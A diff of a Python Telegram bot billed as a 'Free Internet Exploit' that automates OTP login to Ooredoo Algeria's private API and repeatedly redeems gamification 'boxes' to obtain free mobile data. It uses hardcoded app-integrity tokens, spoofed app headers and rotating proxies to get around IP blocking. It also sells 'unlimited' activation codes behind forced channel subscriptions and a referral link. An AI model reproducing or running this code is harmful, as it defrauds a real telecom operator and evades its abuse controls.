@@ -1,15 +1,17 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-🇩🇿 MATRIX BOT — Free Internet Exploit (5 Boxes, Fast, No Stop, 1 Time Only)
-Enhanced with: Proxy support, Unlimited mode via codes, High-concurrency handling
+🇩🇿 MATRIX BOT — Free Internet Exploit (5 Boxes, Webhook, Async, High-Concurrency)
+Enhanced: Webhook + Cloudflare Tunnel, aiohttp async, proxy error reporting,
+per-box internet size messages, TimeBucks support link, auto-delete error messages.
 """
 
-import requests
+import asyncio
+import aiohttp
+import aiofiles
 import time
 import re
 import json
-import threading
 import logging
 import sys
 import uuid
@@ -17,11 +19,12 @@ import base64
 import os
 import urllib3
 import random
+import threading
+import subprocess
 import queue
 from urllib.parse import urlencode, urlparse
 from datetime import datetime, timezone
-from requests.adapters import HTTPAdapter
-from urllib3.util.retry import Retry
+from aiohttp import web, ClientTimeout, TCPConnector
 from concurrent.futures import ThreadPoolExecutor
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -50,11 +53,13 @@ ADMIN_IDS = [8499896271]
 LOG_CHANNEL_ID = ""
 LOG_CHANNEL_USERNAME = "tasjil_bot_activation"
 
-# قنوات الاشتراك الإجباري
 FORCED_CHANNELS_DEFAULT = ["@tasjilbott", "@tasjilapp"]
-
-# أكواد التفعيل بدون قيد
 UNLIMITED_CODES = {"HAAAAQ", "SQAZZZ"}
+
+WEBHOOK_PORT = 8443
+WEBHOOK_PATH = f"/webhook/{TELEGRAM_BOT_TOKEN}"
+
+TIMEBUCKS_LINK = "https://timebucks.com/?refID=227870531"
 
 OOREDOO_BFF = "https://apis.ooredoo.dz/api/ooredoo-bff"
 OOREDOO_AUTH = "https://apis.ooredoo.dz/api/auth/realms/myooredoo/protocol/openid-connect/token"
@@ -68,20 +73,22 @@ OOREDOO_INTEGRITY_1 = "JWBTpxXcH7KY9EXYeIRp8NjQMx2dt3vF8ejjoARazyoFzOw6Cu8+wkeV+
 OOREDOO_INTEGRITY_2 = "JWBTpxXcH7KR/kzaHeUUydDWODuU4i3H4fL9gCgKzyYfyN4qLJJE8keV+zSVHSTeI6aEyC2tbSza/NGmkflQ/UgaNZSN9SKxz7tcdQckHY25n6mOaDZ9PPMQmF4sKZqDwebce/c1SNGNn6qvTULW/L348aJvy7Vii6dyPTu3OSPV9AwKwGwQKNHN61HyK3jx/fa8Os5ux9u3Q654YLZrAJ99QGEm/C9nEBPmlHC98RjovLGBnuJOGx6k7fnyrt/Ogy5fNg+tBgi5HEsoXDAwutX7TOWfx4YKHpKW//TvPRQgp69e2Xqa+CvGJJ+a/WlPMPhRCSsfo0OG04mVvlkc8eXiLzV/GPuJCEmcRf9Z6V+xoDyMtU7OZ3XT5BMhI/D/N68LsRn/9dIBH6X7n0WAW3tzeKZK1zENWFKrd7aLlzEdwFzO/1JTQsEDom5TRie0Kd5yic4BGvS1C1BsA2wJhzyiZ2j7RUE9m8tOAkPEIs929FYIfmH8XcCQKHT0TqT0+N+wCiyfNawPlDhZWcObscFZeEmKgvqiUFCoCj6xI1hvyHK0nu7fnZ/sGc6oNT/SrFjubYWjOyoYFL7gMnlYAhyjZhjuAwN1m1/wjwrOx8DbFr2NW8qb3hv+CIzK1zL3LDryKjqNkTxcOp4aJnmSTa73guCEmWc7pnLkLw5O8RgW7RKHrObeeQ0l9lu4HWXwlhdWRxvVMQDimhtTrGASL6sIuaxyhOkrH4HFImP70SaCoK9+euMxnzkPjg9HqPIFj+I0KSMloVxW"
 
 # ════════════════════════════════════════════════════════════════════════════
-# PROXY MANAGER (thread-safe, supports http/https/socks)
+# PROXY MANAGER (thread-safe, with admin error reporting)
 # ════════════════════════════════════════════════════════════════════════════
 class ProxyManager:
     def __init__(self):
         self._lock = threading.Lock()
-        self._proxies = []          # list of dicts: {"url":..., "type":...}
+        self._proxies = []
         self._enabled = False
         self._index = 0
+        self._error_counts = {}   # url -> consecutive_error_count
+        self._reported = set()    # urls already reported to admin this session
+        self._error_threshold = 3 # report after this many consecutive failures
 
     def add(self, raw):
         raw = raw.strip()
         if not raw:
             return None
-        # Normalize
         ptype = "http"
         low = raw.lower()
         if low.startswith("socks5://") or low.startswith("socks4://") or low.startswith("socks://"):
@@ -95,14 +102,11 @@ class ProxyManager:
         else:
             raw = "http://" + raw
             ptype = "http"
-
-        # validate
         try:
             parsed = urlparse(raw)
             if not parsed.hostname:
                 return None
             if not parsed.port:
-                # try default ports
                 if ptype == "socks":
                     raw = raw.rstrip("/") + ":1080"
                 elif ptype == "https":
@@ -114,11 +118,10 @@ class ProxyManager:
                     return None
         except Exception:
             return None
-
         with self._lock:
             for p in self._proxies:
                 if p["url"] == raw:
-                    return False  # already exists
+                    return False
             self._proxies.append({"url": raw, "type": ptype})
         return True
 
@@ -127,12 +130,16 @@ class ProxyManager:
         with self._lock:
             before = len(self._proxies)
             self._proxies = [p for p in self._proxies if p["url"] != raw]
+            self._error_counts.pop(raw, None)
+            self._reported.discard(raw)
             return len(self._proxies) < before
 
     def clear(self):
         with self._lock:
             self._proxies.clear()
             self._index = 0
+            self._error_counts.clear()
+            self._reported.clear()
 
     def toggle(self):
         with self._lock:
@@ -164,50 +171,29 @@ class ProxyManager:
                 return None
             p = self._proxies[self._index % len(self._proxies)]
             self._index = (self._index + 1) % len(self._proxies)
-        url = p["url"]
-        return {"http": url, "https": url}
+        return {"http": p["url"], "https": p["url"]}, p["url"]
+
+    def report_error(self, proxy_url):
+        """Track proxy errors; return True if threshold hit and not yet reported."""
+        with self._lock:
+            self._error_counts[proxy_url] = self._error_counts.get(proxy_url, 0) + 1
+            count = self._error_counts[proxy_url]
+            if count >= self._error_threshold and proxy_url not in self._reported:
+                self._reported.add(proxy_url)
+                return True, count
+        return False, 0
+
+    def report_success(self, proxy_url):
+        """Reset error count on success."""
+        with self._lock:
+            self._error_counts.pop(proxy_url, None)
+            self._reported.discard(proxy_url)
 
 _proxy_mgr = ProxyManager()
 
 # ════════════════════════════════════════════════════════════════════════════
-# SESSIONS & STORAGE
+# STATE STORAGE
 # ════════════════════════════════════════════════════════════════════════════
-def _make_session(pool_size=50):
-    s = requests.Session()
-    adapter = HTTPAdapter(
-        pool_connections=pool_size,
-        pool_maxsize=pool_size * 2,
-        max_retries=Retry(total=0),
-        pool_block=False
-    )
-    s.mount("https://", adapter)
-    s.mount("http://", adapter)
-    return s
-
-# Use a thread-local session pool for oo requests to handle high concurrency
-_session_pool = queue.Queue()
-_session_pool_lock = threading.Lock()
-_SESSION_POOL_SIZE = 200
-
-def _init_session_pool():
-    for _ in range(_SESSION_POOL_SIZE):
-        _session_pool.put(_make_session(50))
-
-def _acquire_session():
-    try:
-        return _session_pool.get_nowait()
-    except queue.Empty:
-        return _make_session(50)
-
-def _release_session(s):
-    try:
-        _session_pool.put_nowait(s)
-    except queue.Full:
-        pass
-
-_tg_session = _make_session(20)
-_tg_lock = threading.Lock()
-
 DATA_FILE = "bot_data.json"
 _lock = threading.RLock()
 _save_lock = threading.Lock()
@@ -223,7 +209,7 @@ _activations_count = {}
 _max_activations = 1
 active_users = set()
 active_users_lock = threading.Lock()
-_unlimited_users = set()  # chat_ids that entered a valid code
+_unlimited_users = set()
 
 def _do_save():
     with _save_lock:
@@ -375,46 +361,193 @@ def get_user_display(chat_id):
         return f"@{un}"
     return u.get("first_name") or "غير معروف"
 
-def oo_http(method, url, headers, body="", timeout=12):
-    sess = _acquire_session()
-    try:
-        proxies = _proxy_mgr.get_next()
-        kwargs = {
-            "headers": headers,
-            "timeout": timeout,
-            "verify": False,
-        }
-        if proxies:
-            kwargs["proxies"] = proxies
+# ════════════════════════════════════════════════════════════════════════════
+# ASYNC HTTP (aiohttp) — HIGH CONCURRENCY CORE
+# ════════════════════════════════════════════════════════════════════════════
+# Shared aiohttp session — created once, reused across all requests
+_aio_session: aiohttp.ClientSession = None
+_aio_tg_session: aiohttp.ClientSession = None
 
+def _make_connector():
+    return TCPConnector(
+        limit=500,           # max total connections
+        limit_per_host=100,  # per-host pool
+        ttl_dns_cache=300,
+        use_dns_cache=True,
+        ssl=False,
+    )
+
+async def _init_aio_sessions():
+    global _aio_session, _aio_tg_session
+    timeout = ClientTimeout(total=15, connect=5, sock_read=12)
+    _aio_session = aiohttp.ClientSession(
+        connector=_make_connector(),
+        timeout=timeout,
+    )
+    tg_timeout = ClientTimeout(total=10, connect=3, sock_read=8)
+    _aio_tg_session = aiohttp.ClientSession(
+        connector=_make_connector(),
+        timeout=tg_timeout,
+    )
+
+async def oo_http_async(method, url, headers, body="", timeout=12):
+    """Async HTTP for Ooredoo API — full proxy support with error reporting."""
+    proxy_result = _proxy_mgr.get_next()
+    proxy_url = None
+    proxy_dict = None
+    if proxy_result:
+        proxy_dict, proxy_url = proxy_result
+
+    kwargs = {
+        "headers": headers,
+        "ssl": False,
+    }
+    if proxy_url:
+        kwargs["proxy"] = proxy_url
+
+    try:
         if method == "GET":
-            r = sess.get(url, **kwargs)
+            async with _aio_session.get(url, **kwargs) as r:
+                txt = await r.text()
+                status = r.status
+                resp_headers = {k.lower(): v for k, v in r.headers.items()}
         elif method == "POST":
-            r = sess.post(url, data=body, **kwargs)
+            data = body if isinstance(body, str) else json.dumps(body)
+            async with _aio_session.post(url, data=data, **kwargs) as r:
+                txt = await r.text()
+                status = r.status
+                resp_headers = {k.lower(): v for k, v in r.headers.items()}
         else:
             return None
 
-        txt = r.text
         if "Request Rejected" in txt or "<!DOCTYPE" in txt[:200]:
-            return {"ip_blocked": True, "code": r.status_code, "body": txt}
+            if proxy_url:
+                should_report, err_count = _proxy_mgr.report_error(proxy_url)
+                if should_report:
+                    asyncio.create_task(_notify_admin_proxy_error(proxy_url, err_count, "IP محظور / Request Rejected"))
+            return {"ip_blocked": True, "code": status, "body": txt}
+
+        if proxy_url:
+            _proxy_mgr.report_success(proxy_url)
+
         try:
-            j = r.json()
+            j = json.loads(txt)
         except:
             j = None
         return {
-            "code": r.status_code,
+            "code": status,
             "body": txt,
-            "headers": {k.lower(): v for k, v in r.headers.items()},
+            "headers": resp_headers,
             "json": j,
         }
-    except requests.exceptions.ProxyError as e:
-        logger.warning(f"proxy error: {e}")
-        return None
-    except Exception:
-        return None
-    finally:
-        _release_session(sess)
 
+    except aiohttp.ClientProxyConnectionError as e:
+        logger.warning(f"proxy connect error [{proxy_url}]: {e}")
+        if proxy_url:
+            should_report, err_count = _proxy_mgr.report_error(proxy_url)
+            if should_report:
+                asyncio.create_task(_notify_admin_proxy_error(proxy_url, err_count, f"خطأ اتصال: {type(e).__name__}"))
+        return None
+    except aiohttp.ServerTimeoutError as e:
+        logger.warning(f"timeout [{proxy_url or 'direct'}]: {e}")
+        if proxy_url:
+            should_report, err_count = _proxy_mgr.report_error(proxy_url)
+            if should_report:
+                asyncio.create_task(_notify_admin_proxy_error(proxy_url, err_count, "Timeout"))
+        return None
+    except Exception as e:
+        logger.debug(f"oo_http_async error: {e}")
+        if proxy_url:
+            should_report, err_count = _proxy_mgr.report_error(proxy_url)
+            if should_report:
+                asyncio.create_task(_notify_admin_proxy_error(proxy_url, err_count, str(e)[:80]))
+        return None
+
+async def _notify_admin_proxy_error(proxy_url, err_count, reason):
+    """Send proxy error alert to all admins."""
+    msg = (
+        f"⚠️ <b>تنبيه: بروكسي معطل</b>\n\n"
+        f"🌐 <code>{proxy_url}</code>\n"
+        f"❌ <b>السبب:</b> {reason}\n"
+        f"🔢 <b>عدد الأخطاء المتتالية:</b> {err_count}\n"
+        f"⏰ <b>الوقت:</b> {datetime.now(timezone.utc).strftime('%H:%M:%S UTC')}"
+    )
+    for admin_id in ADMIN_IDS:
+        await tg_send_async_fn(admin_id, msg)
+
+# ════════════════════════════════════════════════════════════════════════════
+# TELEGRAM ASYNC (aiohttp)
+# ════════════════════════════════════════════════════════════════════════════
+async def tg_request_async(method, **kwargs):
+    try:
+        async with _aio_tg_session.post(
+            f"{TELEGRAM_API}/{method}",
+            json=kwargs,
+        ) as r:
+            return await r.json()
+    except Exception as e:
+        logger.debug(f"tg_request_async {method}: {e}")
+        return None
+
+async def tg_send_async_fn(chat_id, text, keyboard=None, parse_mode="HTML"):
+    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
+    if keyboard:
+        payload["reply_markup"] = {"keyboard": keyboard, "resize_keyboard": True}
+    return await tg_request_async("sendMessage", **payload)
+
+async def tg_buttons_async(chat_id, text, rows):
+    keyboard = [[{"text": btn} for btn in row] for row in rows]
+    return await tg_send_async_fn(chat_id, text, keyboard)
+
+async def tg_delete_msg(chat_id, message_id):
+    try:
+        await tg_request_async("deleteMessage", chat_id=chat_id, message_id=message_id)
+    except:
+        pass
+
+async def tg_send_then_delete(chat_id, text, rows=None, delay=5.0):
+    """Send a message and auto-delete it after `delay` seconds."""
+    if rows:
+        keyboard = [[{"text": btn} for btn in row] for row in rows]
+        result = await tg_request_async(
+            "sendMessage",
+            chat_id=chat_id,
+            text=text,
+            parse_mode="HTML",
+            reply_markup={"keyboard": keyboard, "resize_keyboard": True}
+        )
+    else:
+        result = await tg_request_async(
+            "sendMessage",
+            chat_id=chat_id,
+            text=text,
+            parse_mode="HTML",
+        )
+    if result and result.get("ok"):
+        msg_id = result["result"]["message_id"]
+        asyncio.create_task(_delayed_delete(chat_id, msg_id, delay))
+
+async def _delayed_delete(chat_id, message_id, delay):
+    await asyncio.sleep(delay)
+    await tg_delete_msg(chat_id, message_id)
+
+async def send_log(text):
+    try:
+        target = None
+        if LOG_CHANNEL_ID and str(LOG_CHANNEL_ID).startswith("-100"):
+            target = LOG_CHANNEL_ID
+        elif LOG_CHANNEL_USERNAME:
+            target = LOG_CHANNEL_USERNAME if LOG_CHANNEL_USERNAME.startswith("@") \
+                else "@" + LOG_CHANNEL_USERNAME
+        if target:
+            await tg_request_async("sendMessage", chat_id=target,
+                                   text=text, parse_mode="HTML")
+    except Exception as e:
+        logger.warning(f"send_log: {e}")
+
+# ════════════════════════════════════════════════════════════════════════════
+# HEADERS
+# ════════════════════════════════════════════════════════════════════════════
 def oo_base_h(msisdn, fp, corr, ts, iid, psig):
     return {
         "User-Agent": "Dart/3.11 (dart:io)",
@@ -454,9 +587,9 @@ def oo_authed_h(msisdn, token, tokh):
     }
 
 # ════════════════════════════════════════════════════════════════════════════
-# OOREDOO OTP
+# OOREDOO OTP (async)
 # ════════════════════════════════════════════════════════════════════════════
-def oo_send_otp(msisdn, device):
+async def oo_send_otp(msisdn, device):
     iid = device["instance_id"]
     psig = device["plat_sig"]
     ts = oo_now_ms()
@@ -468,7 +601,7 @@ def oo_send_otp(msisdn, device):
         "x-path": "/api/auth/realms/myooredoo/protocol/openid-connect/token",
         "x-method": "POST",
     })
-    r3 = oo_http("POST", f"{OOREDOO_BFF}/checkpoint/token", h3, "{}")
+    r3 = await oo_http_async("POST", f"{OOREDOO_BFF}/checkpoint/token", h3, "{}")
     if not r3 or r3.get("ip_blocked"):
         logger.warning("send_otp: checkpoint failed or IP blocked")
         return None
@@ -500,14 +633,14 @@ def oo_send_otp(msisdn, device):
         "grant_type": "password",
         "username": msisdn,
     })
-    r4 = oo_http("POST", OOREDOO_AUTH, h4, b4)
+    r4 = await oo_http_async("POST", OOREDOO_AUTH, h4, b4)
     if r4 and not r4.get("ip_blocked"):
         logger.info(f"send_otp: HTTP {r4.get('code')}")
         return {"ok": True}
     logger.warning("send_otp: failed to reach auth")
     return None
 
-def oo_verify_otp(msisdn, otp, device):
+async def oo_verify_otp(msisdn, otp, device):
     iid = device["instance_id"]
     psig = device["plat_sig"]
     ts = oo_now_ms()
@@ -519,7 +652,7 @@ def oo_verify_otp(msisdn, otp, device):
         "x-path": "/api/auth/realms/myooredoo/protocol/openid-connect/token",
         "x-method": "POST",
     })
-    r6 = oo_http("POST", f"{OOREDOO_BFF}/checkpoint/token", h6, "{}")
+    r6 = await oo_http_async("POST", f"{OOREDOO_BFF}/checkpoint/token", h6, "{}")
     if not r6 or r6.get("ip_blocked"):
         return None
 
@@ -551,15 +684,13 @@ def oo_verify_otp(msisdn, otp, device):
         "username": msisdn,
         "otp": otp,
     })
-    r7 = oo_http("POST", OOREDOO_AUTH, h7, b7)
+    r7 = await oo_http_async("POST", OOREDOO_AUTH, h7, b7)
 
     if not r7:
         return None
-
     code = r7.get("code")
     if code in (400, 401, 403):
         return "wrong_otp"
-
     if code == 200 and r7.get("json") and "access_token" in r7["json"]:
         j = r7["json"]
         return {
@@ -574,64 +705,35 @@ def oo_verify_otp(msisdn, otp, device):
     return None
 
 # ════════════════════════════════════════════════════════════════════════════
-# EXPLOIT — 5 BOXES (High concurrency version)
+# EXPLOIT — 5 BOXES (Fully Async, Per-Box Live Messages, High Concurrency)
 # ════════════════════════════════════════════════════════════════════════════
-def oo_do_open_box(chat_id, user, unlimited=False):
-    with active_users_lock:
-        if chat_id in active_users:
-            tg_send(chat_id, "⚠️ لديك عملية تفعيل قيد التنفيذ حالياً. يرجى الانتظار.")
-            return
-        active_users.add(chat_id)
-
-    m = user.get("msisdn", "")
-
-    if not unlimited:
-        with _lock:
-            count = _activations_count.get(m, 0)
-        if count >= _max_activations and chat_id not in ADMIN_IDS:
-            with active_users_lock:
-                active_users.discard(chat_id)
-            tg_buttons(
-                chat_id,
-                f"❌ لقد استنفدت الحد الأقصى ({_max_activations}) لهذا الرقم.\n"
-                f"استخدم كود التفعيل بدون قيد للحصول على تفعيل غير محدود.",
-                [["🔓 تفعيل بدون قيد"], ["🔙 رجوع للقائمة"]]
-            )
-            return
-
-    threading.Thread(target=run_5_boxes, args=(chat_id, user, unlimited), daemon=True).start()
-
-def _single_box_attempt(i, user, m):
-    """Runs one full box cycle. Returns (value, unit, success)."""
+async def _single_box_attempt_async(i, user, m):
+    """One full box cycle — async. Returns (value, unit, success)."""
     try:
         iid = user.get("tok_instance_id") or oo_new_iid()
         psig = user.get("tok_plat_sig") or oo_new_psig(iid)
+        tok_info = {
+            "tok_timestamp": user.get("tok_timestamp"),
+            "tok_instance_id": iid,
+            "tok_plat_sig": psig,
+        }
 
         # 1. Purchase
-        h_buy = oo_authed_h(m, user.get("access_token"), {
-            "tok_timestamp": user.get("tok_timestamp"),
-            "tok_instance_id": iid,
-            "tok_plat_sig": psig,
-        })
+        h_buy = oo_authed_h(m, user.get("access_token"), tok_info)
         h_buy["content-type"] = "application/json; charset=utf-8"
         payload = {"msisdn": m, "bundleCode": "DATA_100_KTM"}
-        oo_http("POST", f"{OOREDOO_BFF}/bundle/bundlePurchase/v2",
-                h_buy, json.dumps(payload))
+        await oo_http_async("POST", f"{OOREDOO_BFF}/bundle/bundlePurchase/v2",
+                            h_buy, json.dumps(payload))
 
-        time.sleep(random.uniform(2.0, 3.0))
+        await asyncio.sleep(random.uniform(2.0, 3.0))
 
         # 2. Fetch available boxes
-        h_box = oo_authed_h(m, user.get("access_token"), {
-            "tok_timestamp": user.get("tok_timestamp"),
-            "tok_instance_id": iid,
-            "tok_plat_sig": psig,
-        })
-        r_box = oo_http(
+        h_box = oo_authed_h(m, user.get("access_token"), tok_info)
+        r_box = await oo_http_async(
             "GET",
             f"{OOREDOO_BFF}/gamification/power-snake?status=AVAILABLE",
             h_box
         )
-
         if not r_box or r_box.get("code") != 200:
             return 0.0, "", False
 
@@ -642,13 +744,9 @@ def _single_box_attempt(i, user, m):
         box_uuid = items[0].get("uuid")
 
         # 3. Redeem
-        h_redeem = oo_authed_h(m, user.get("access_token"), {
-            "tok_timestamp": user.get("tok_timestamp"),
-            "tok_instance_id": iid,
-            "tok_plat_sig": psig,
-        })
+        h_redeem = oo_authed_h(m, user.get("access_token"), tok_info)
         h_redeem["content-type"] = "application/json"
-        r_redeem = oo_http(
+        r_redeem = await oo_http_async(
             "POST",
             f"{OOREDOO_BFF}/gamification/power-snake/{box_uuid}/redeem",
             h_redeem, ""
@@ -667,36 +765,48 @@ def _single_box_attempt(i, user, m):
         logger.error(f"Box attempt {i+1} error: {e}")
         return 0.0, "", False
 
-def run_5_boxes(chat_id, user, unlimited=False):
+async def run_5_boxes(chat_id, user, unlimited=False):
     total_val = 0.0
     total_unit = ""
     m = user.get("msisdn", "")
     done_count = 0
+    box_results = []
 
     try:
         mode = "بدون قيد 🔓" if unlimited else "عادي"
-        tg_send(chat_id, f"⏳ <b>جاري تفعيل 5 صناديق... ({mode})</b>\n\n"
-                          f"يرجى الانتظار قليلاً حتى تنتهي العملية.")
+        await tg_send_async_fn(
+            chat_id,
+            f"⏳ <b>جاري تفعيل 5 صناديق... ({mode})</b>\n\nيرجى الانتظار..."
+        )
 
-        # We run boxes sequentially per user (each box depends on purchase step)
+        # Boxes run sequentially (each depends on prior purchase step)
         for i in range(5):
-            val, unit, ok = _single_box_attempt(i, user, m)
+            val, unit, ok = await _single_box_attempt_async(i, user, m)
             if ok:
                 total_val += val
                 total_unit = unit or total_unit
                 done_count += 1
-            time.sleep(random.uniform(0.8, 1.2))
+                box_results.append((val, unit))
+                # Per-box live message
+                await tg_send_async_fn(
+                    chat_id,
+                    f"📦 <b>الصندوق {i+1}/5</b>\n"
+                    f"{'✅ نجح' if ok else '❌ فشل'} — <b>{val} {unit}</b> انترنت"
+                )
+            else:
+                box_results.append((0.0, ""))
+                await tg_send_async_fn(
+                    chat_id,
+                    f"📦 <b>الصندوق {i+1}/5</b>\n❌ لم ينجح هذا الصندوق"
+                )
+            await asyncio.sleep(random.uniform(0.8, 1.2))
 
         # Update counters
-        if not unlimited:
-            with _lock:
+        with _lock:
+            if not unlimited:
                 _activations_count[m] = _activations_count.get(m, 0) + 1
-                _bot_stats["activations"] += 1
-            _save_async()
-        else:
-            with _lock:
-                _bot_stats["activations"] += 1
-            _save_async()
+            _bot_stats["activations"] += 1
+        _save_async()
 
         # Log to channel
         user_str = get_user_display(chat_id)
@@ -713,78 +823,74 @@ def run_5_boxes(chat_id, user, unlimited=False):
             f"📦 <b>الصناديق المفتوحة:</b> {done_count}/5\n"
             f"🕐 <b>الوقت:</b> {utc_time}"
         )
-        threading.Thread(target=send_log, args=(log_msg,), daemon=True).start()
+        asyncio.create_task(send_log(log_msg))
 
-        msg_text = (
-            f"✅ <b>تم التفعيل بنجاح!</b>\n\n"
-            f"📦 <b>الصناديق المفتوحة:</b> {done_count}\n"
-            f"💰 <b>المجموع:</b> {total_val} {total_unit}\n"
-            f"📱 <b>الرقم:</b> <code>{masked}</code>"
+        # Final success message with TimeBucks support link
+        box_detail_lines = "\n".join(
+            f"  📦 الصندوق {idx+1}: {'✅ ' + str(v) + ' ' + u if v > 0 else '❌ فشل'}"
+            for idx, (v, u) in enumerate(box_results)
         )
-        tg_buttons(chat_id, msg_text, [["🔙 رجوع للقائمة"]])
+        msg_text = (
+            f"✅ <b>اكتمل التفعيل!</b>\n\n"
+            f"<b>تفاصيل كل صندوق:</b>\n{box_detail_lines}\n\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"📊 <b>النتيجة النهائية</b>\n"
+            f"📦 الصناديق الناجحة: <b>{done_count}/5</b>\n"
+            f"💰 إجمالي الانترنت: <b>{total_val} {total_unit}</b>\n"
+            f"📱 الرقم: <code>{masked}</code>\n"
+            f"━━━━━━━━━━━━━━━━━━\n\n"
+            f"💙 <b>إذا كنت تريد دعمنا حتى نستمر، قم بالدخول للموقع والتسجيل بحساب Google:</b>\n"
+            f"🔗 <a href='{TIMEBUCKS_LINK}'>timebucks.com — سجّل بحساب Google</a>"
+        )
+        await tg_buttons_async(chat_id, msg_text, [["🔙 رجوع للقائمة"]])
 
     except Exception as e:
         logger.exception(f"run_5_boxes fatal: {e}")
         try:
-            tg_buttons(chat_id, "⚠️ حدث خطأ أثناء التفعيل. حاول مجدداً.",
-                       [["🔙 رجوع للقائمة"]])
+            await tg_buttons_async(chat_id, "⚠️ حدث خطأ أثناء التفعيل. حاول مجدداً.",
+                                   [["🔙 رجوع للقائمة"]])
         except:
             pass
     finally:
         with active_users_lock:
             active_users.discard(chat_id)
 
-# ════════════════════════════════════════════════════════════════════════════
-# TELEGRAM
-# ════════════════════════════════════════════════════════════════════════════
-def tg_request(method, **kwargs):
-    try:
-        with _tg_lock:
-            return _tg_session.post(f"{TELEGRAM_API}/{method}",
-                                    json=kwargs, timeout=8).json()
-    except:
-        return None
+async def oo_do_open_box(chat_id, user, unlimited=False):
+    with active_users_lock:
+        if chat_id in active_users:
+            await tg_send_async_fn(chat_id, "⚠️ لديك عملية تفعيل قيد التنفيذ. يرجى الانتظار.")
+            return
+        active_users.add(chat_id)
 
-def tg_send(chat_id, text, keyboard=None):
-    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
-    if keyboard:
-        payload["reply_markup"] = {"keyboard": keyboard, "resize_keyboard": True}
-    return tg_request("sendMessage", **payload)
+    m = user.get("msisdn", "")
+    if not unlimited:
+        with _lock:
+            count = _activations_count.get(m, 0)
+        if count >= _max_activations and chat_id not in ADMIN_IDS:
+            with active_users_lock:
+                active_users.discard(chat_id)
+            await tg_buttons_async(
+                chat_id,
+                f"❌ لقد استنفدت الحد الأقصى ({_max_activations}) لهذا الرقم.\n"
+                f"استخدم كود التفعيل بدون قيد للحصول على تفعيل غير محدود.",
+                [["🔓 تفعيل بدون قيد"], ["🔙 رجوع للقائمة"]]
+            )
+            return
 
-def tg_buttons(chat_id, text, rows):
-    keyboard = [[{"text": btn} for btn in row] for row in rows]
-    return tg_send(chat_id, text, keyboard)
-
-def tg_send_async(chat_id, text, keyboard=None):
-    threading.Thread(target=tg_send, args=(chat_id, text, keyboard), daemon=True).start()
-
-def send_log(text):
-    try:
-        target = None
-        if LOG_CHANNEL_ID and str(LOG_CHANNEL_ID).startswith("-100"):
-            target = LOG_CHANNEL_ID
-        elif LOG_CHANNEL_USERNAME:
-            target = LOG_CHANNEL_USERNAME if LOG_CHANNEL_USERNAME.startswith("@") \
-                else "@" + LOG_CHANNEL_USERNAME
-        if target:
-            tg_request("sendMessage", chat_id=target,
-                       text=text, parse_mode="HTML")
-    except Exception as e:
-        logger.warning(f"send_log: {e}")
+    asyncio.create_task(run_5_boxes(chat_id, user, unlimited))
 
 # ════════════════════════════════════════════════════════════════════════════
-# FORCE SUB
+# FORCE SUBSCRIBE
 # ════════════════════════════════════════════════════════════════════════════
-_sub_cache = {}       # chat_id -> (timestamp, bool)
+_sub_cache = {}
 _sub_cache_lock = threading.Lock()
-_SUB_CACHE_TTL = 30   # seconds
+_SUB_CACHE_TTL = 30
 
-def check_sub(chat_id):
+async def check_sub(chat_id):
     if not _forced_channels:
         return True
     if chat_id in ADMIN_IDS:
         return True
-
     now = time.time()
     with _sub_cache_lock:
         entry = _sub_cache.get(chat_id)
@@ -794,14 +900,12 @@ def check_sub(chat_id):
     ok = True
     for ch in _forced_channels:
         try:
-            r = _tg_session.get(
+            async with _aio_tg_session.get(
                 f"{TELEGRAM_API}/getChatMember",
-                params={"chat_id": ch, "user_id": chat_id},
-                timeout=5,
-            )
-            j = r.json()
+                params={"chat_id": ch, "user_id": chat_id}
+            ) as r:
+                j = await r.json()
             if not j.get("ok"):
-                logger.warning(f"check_sub {ch}: {j.get('description')}")
                 ok = False
                 break
             status = j.get("result", {}).get("status")
@@ -824,13 +928,13 @@ def invalidate_sub_cache(chat_id=None):
         else:
             _sub_cache.pop(chat_id, None)
 
-def send_join_msg(chat_id):
+async def send_join_msg(chat_id):
     kb_rows = []
     for ch in _forced_channels:
         link = f"https://t.me/{ch.replace('@', '')}"
         kb_rows.append([{"text": f"📢 اشترك في {ch}", "url": link}])
     kb_rows.append([{"text": "✅ تحقق من الاشتراك", "callback_data": "check_sub"}])
-    tg_request(
+    await tg_request_async(
         "sendMessage",
         chat_id=chat_id,
         text="⚠️ <b>باش تستعمل البوت، لازم تشترك في القنوات:</b>",
@@ -841,19 +945,19 @@ def send_join_msg(chat_id):
 # ════════════════════════════════════════════════════════════════════════════
 # MENUS
 # ════════════════════════════════════════════════════════════════════════════
-def oo_menu(chat_id, user=None):
+async def oo_menu(chat_id, user=None):
     unlimited = chat_id in _unlimited_users or chat_id in ADMIN_IDS
     kb = [
         ["🌐 تفعيل انترنت مجاني"],
-        ["🔓 تفعيل بدون قيد"] if not unlimited else ["🔓 تفعيل بدون قيد ✅"],
+        ["🔓 تفعيل بدون قيد ✅"] if unlimited else ["🔓 تفعيل بدون قيد"],
         ["📱 تسجيل رقم جديد", "💰 الرصيد"],
         ["🚪 خروج"],
     ]
     if chat_id in ADMIN_IDS:
         kb.insert(1, ["⚙️ لوحة التحكم"])
-    tg_buttons(chat_id, "اختر من الأزرار 👇🏻", kb)
+    await tg_buttons_async(chat_id, "اختر من الأزرار 👇🏻", kb)
 
-def admin_menu(chat_id):
+async def admin_menu(chat_id):
     proxy_status = "🟢 مفعل" if _proxy_mgr.enabled else "🔴 معطل"
     kb = [
         ["⚡ حالة البوت: يعمل 🟢",
@@ -869,9 +973,9 @@ def admin_menu(chat_id):
         f"⚡ التفعيلات: {_bot_stats.get('activations', 0)}\n"
         f"🌐 البروكسي: {proxy_status} | العدد: {_proxy_mgr.count}\n"
     )
-    tg_buttons(chat_id, text, kb)
+    await tg_buttons_async(chat_id, text, kb)
 
-def proxy_menu(chat_id):
+async def proxy_menu(chat_id):
     status = "🟢 مفعل" if _proxy_mgr.enabled else "🔴 معطل"
     kb = [
         [f"🔛 تشغيل/إيقاف: {status}"],
@@ -885,48 +989,72 @@ def proxy_menu(chat_id):
         f"العدد: {_proxy_mgr.count}\n\n"
         f"يدعم: http / https / socks4 / socks5"
     )
-    tg_buttons(chat_id, text, kb)
+    await tg_buttons_async(chat_id, text, kb)
+
+# ════════════════════════════════════════════════════════════════════════════
+# UNLIMITED CODE
+# ════════════════════════════════════════════════════════════════════════════
